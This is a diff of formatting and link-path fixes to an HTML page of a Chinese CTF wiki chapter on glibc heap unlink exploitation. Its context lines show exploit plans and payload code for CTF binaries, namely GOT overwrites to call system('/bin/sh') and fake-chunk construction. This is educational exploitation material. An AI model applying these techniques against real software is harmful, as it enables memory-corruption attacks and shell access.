@@ -1867,7 +1867,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../crypto/attack_summary/attack-mode/" title="简介" class="md-nav__link">
+    <a href="../../../crypto/attack-summary/attack-mode/" title="简介" class="md-nav__link">
       简介
     </a>
   </li>
@@ -1879,7 +1879,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../crypto/attack_summary/meet-in-the-middle/" title="中间相遇攻击" class="md-nav__link">
+    <a href="../../../crypto/attack-summary/meet-in-the-middle/" title="中间相遇攻击" class="md-nav__link">
       中间相遇攻击
     </a>
   </li>
@@ -1891,7 +1891,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../crypto/attack_summary/bit-attack/" title="比特攻击" class="md-nav__link">
+    <a href="../../../crypto/attack-summary/bit-attack/" title="比特攻击" class="md-nav__link">
       比特攻击
     </a>
   </li>
@@ -4117,7 +4117,7 @@
 <h2 id="_1">原理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
 <p>我们在利用 unlink 所造成的漏洞时，其实就是对进行 unlink chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p>
 <p>我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来，然后和目前物理相邻的 free chunk 进行合并。其基本的过程如下</p>
-<p><img alt="" src="/pwn/heap/figure/unlink_smallbin_intro.png" /></p>
+<p><img alt="" src="../figure/unlink_smallbin_intro.png" /></p>
 <p>下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。</p>
 <h3 id="unlink_1">古老的 unlink<a class="headerlink" href="#unlink_1" title="Permanent link">&para;</a></h3>
 <p>在最初 unlink 实现的时候，其实是没有对双向链表检查的，也就是说，没有以下的代码。</p>
@@ -4133,10 +4133,10 @@
                 <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>    \
               <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span>                                      \
                                <span class="s">&quot;corrupted double-linked list (not small)&quot;</span><span class="p">,</span>    \
-                               <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>   
+                               <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>
 </pre></div>
 <strong>这里我们以 32 位为例</strong>，假设堆内存最初的布局是下面的样子</p>
-<p><img alt="" src="/pwn/heap/figure/old_unlink_vul.png" /></p>
+<p><img alt="" src="../figure/old_unlink_vul.png" /></p>
 <p>那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们free(Q)时</p>
 <ol>
 <li>glibc 判断这个块是 small chunk。</li>
@@ -4172,7 +4172,7 @@
 </ul>
 <p>即改写了指针 P 的内容，将其指向了比自己低 12 的地址处。</p>
 <p>而如果我们想要使得两者都指向 P，只需要按照如下方式修改即可</p>
-<p><img alt="" src="/pwn/heap/figure/new_unlink_vul.png" /></p>
+<p><img alt="" src="../figure/new_unlink_vul.png" /></p>
 <p>我们会通过之后的例子来说明，我们这样的修改是可以达到一定的效果的。</p>
 <p>需要注意的是，这里我们并没有违背下面的约束。</p>
 <div class="codehilite"><pre><span></span>    <span class="c1">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span>
@@ -4183,9 +4183,9 @@
 <p><strong>此外，其实如果我们设置next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。</strong></p>
 <h2 id="2014-hitcon-stkof">2014 HITCON stkof<a class="headerlink" href="#2014-hitcon-stkof" title="Permanent link">&para;</a></h2>
 <h3 id="_2">基本信息<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>➜  2014_hitcon_stkof git:<span class="o">(</span>master<span class="o">)</span> file stkof   
+<div class="codehilite"><pre><span></span>➜  2014_hitcon_stkof git:<span class="o">(</span>master<span class="o">)</span> file stkof
 stkof: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
-➜  2014_hitcon_stkof git:<span class="o">(</span>master<span class="o">)</span> checksec stkof        
+➜  2014_hitcon_stkof git:<span class="o">(</span>master<span class="o">)</span> checksec stkof
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -4244,19 +4244,19 @@ Top Chunk: 0xe05410
 Last Remainder: 0
 
 0xe05000 PREV_INUSE {
-  prev_size = 0, 
-  size = 1041, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 1041,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0xe05410 PREV_INUSE {
-  prev_size = 0, 
-  size = 134129, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 134129,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 </pre></div>
@@ -4267,27 +4267,27 @@ Top Chunk: 0xe05430
 Last Remainder: 0
 
 0xe05000 PREV_INUSE {
-  prev_size = 0, 
-  size = 1041, 
-  fd = 0xa3631, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 1041,
+  fd = 0xa3631,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0xe05410 FASTBIN {
-  prev_size = 0, 
-  size = 33, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 33,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x20bd1
 }
 0xe05430 PREV_INUSE {
-  prev_size = 0, 
-  size = 134097, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 134097,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 </pre></div>
@@ -4331,35 +4331,35 @@ Top Chunk: 0xe05840
 Last Remainder: 0
 
 0xe05000 PREV_INUSE {
-  prev_size = 0, 
-  size = 1041, 
-  fd = 0xa3631, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 1041,
+  fd = 0xa3631,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0xe05410 FASTBIN {
-  prev_size = 0, 
-  size = 33, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 33,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x411
 }
 0xe05430 PREV_INUSE {
-  prev_size = 0, 
-  size = 1041, 
-  fd = 0xa4b4f, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 1041,
+  fd = 0xa4b4f,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0xe05840 PREV_INUSE {
-  prev_size = 0, 
-  size = 133057, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 133057,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 </pre></div>
@@ -4371,19 +4371,19 @@ Top Chunk: 0x1e9b010
 Last Remainder: 0
 
 0x1e9a000 PREV_INUSE {
-  prev_size = 0, 
-  size = 4113, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 4113,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0x1e9b010 PREV_INUSE {
-  prev_size = 0, 
-  size = 135153, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 135153,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 </pre></div>
@@ -4394,7 +4394,7 @@ Last Remainder: 0
 <ul>
 <li>利用 unlink 修改 global[2] 为 &amp;global[2]-0x18。</li>
 <li>利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为puts@got 地址，global[2] 为 atoi@got 地址。</li>
-<li>修改 <code>free@got</code> 为 <code>puts@plt</code> 的地址，从而当再次调用 <code>free</code> 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。 </li>
+<li>修改 <code>free@got</code> 为 <code>puts@plt</code> 的地址，从而当再次调用 <code>free</code> 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。</li>
 <li>free global[2]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。</li>
 <li>修改 <code>atoi@got</code> 为 system 函数地址，再次调用时，输入 /bin/sh 地址即可。</li>
 </ul>
@@ -4435,7 +4435,7 @@ Last Remainder: 0
 <span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
     <span class="c1"># trigger to malloc buffer for io function</span>
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>  <span class="c1"># idx 1</span>
-    <span class="c1"># begin </span>
+    <span class="c1"># begin</span>
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>  <span class="c1"># idx 2</span>
     <span class="c1"># small chunk size in order to trigger unlink</span>
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># idx 3</span>
@@ -4603,7 +4603,7 @@ Last Remainder: 0
                                    |    size=0x91    |
                                    +-----------------+
                                    |    prevsize     |
-                                   +-----------------+------------
+                                   +-----------------|------------
                                    |    unused       |
                                    +-----------------+
                                    |    &#39;a&#39;*8        |
@@ -4611,7 +4611,7 @@ Last Remainder: 0
                                    |    size=0x20    |
                                    +-----------------+
                                    |    prevsize     |
-                                   +-----------------+-------------
+                                   +-----------------|-------------
                                    |    unused       |
                                    +-----------------+
                                    |  prev_size=0x60 |
@@ -4653,7 +4653,7 @@ fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+
                                    |    size=0x90    |
                                    +-----------------+
                                    |    0xa0         |
-                                   +-----------------+------------
+                                   +-----------------|------------
                                    |    &#39;a&#39;*8        |
                                    +-----------------+
                                    |    &#39;a&#39;*8        |
@@ -4661,7 +4661,7 @@ fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+
                                    |    size=0x20    |
                                    +-----------------+
                                    |    prevsize     |
-                                   +-----------------+-------------
+                                   +-----------------|-------------
                                    |    unused       |
                                    +-----------------+
                                    |  prev_size=0x60 |
@@ -4732,9 +4732,9 @@ fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+
 <p>此时如果我们再调用 atoi ，其实调用的就是 system 函数，所以就可以拿到shell了。</p>
 <h2 id="2017-insomnihack-wheelofrobots">2017 insomni'hack wheelofrobots<a class="headerlink" href="#2017-insomnihack-wheelofrobots" title="Permanent link">&para;</a></h2>
 <h3 id="_9">基本信息<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>➜  2017_insomni<span class="s1">&#39;hack_wheelofrobots git:(master) file wheelofrobots </span>
+<div class="codehilite"><pre><span></span>➜  2017_insomni<span class="s1">&#39;hack_wheelofrobots git:(master) file wheelofrobots</span>
 <span class="s1">wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped</span>
-<span class="s1">➜  2017_insomni&#39;</span>hack_wheelofrobots git:<span class="o">(</span>master<span class="o">)</span> checksec wheelofrobots 
+<span class="s1">➜  2017_insomni&#39;</span>hack_wheelofrobots git:<span class="o">(</span>master<span class="o">)</span> checksec wheelofrobots
 <span class="o">[</span>*<span class="o">]</span> <span class="s2">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni&#39;hack_wheelofrobots/wheelofrobots&quot;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -4922,7 +4922,7 @@ fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+
 
 <h3 id="_12">题目<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
 <ul>
-<li><a href="https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl">DEFCON 2017 Qualifiers beatmeonthedl</a> </li>
+<li><a href="https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl">DEFCON 2017 Qualifiers beatmeonthedl</a></li>
 </ul>
 <h3 id="_13">参考<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
 <ul>
@@ -5047,9 +5047,9 @@ edit(-9223372036854775808,data);
 <p>我们使用的溢出数据是用于构造一个fake chunk来实现safe unlink的利用，具体的原理可以看这一章节的讲解。</p>
 <div class="codehilite"><pre><span></span>data = &#39;&#39;
 data += p64(0) + p64(512+1) #fake chunk header
-data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk 
-data += &#39;A&#39;*(512-32) 
-data += p64(512) + p64(512+16) 
+data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk
+data += &#39;A&#39;*(512-32)
+data += p64(512) + p64(512+16)
 </pre></div>
 
 <p>之后释放note4，note3与note4就会合并。note3_ptr会指向note0_ptr的位置。这样我们通过不断的修改note0_ptr的值和edit note0就可以实现任意地址写数据。</p>
@@ -5116,7 +5116,7 @@ malloc(512,&#39;/bin/sh\0&#39;)
 malloc(512,&#39;/bin/sh\0&#39;)
 malloc(512,p64(0x400ef8))
 malloc(512,&#39;/bin/sh\0&#39;)
-# 2. make a fake chunk and modify the next chunk&#39;s pre size 
+# 2. make a fake chunk and modify the next chunk&#39;s pre size
 fakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + &#39;A&#39;*(512-32) + p64(512) + p64(512+16)
 edit(3,&#39;aaaaaa&#39;)
 edit(intoverflow,fakechunk)
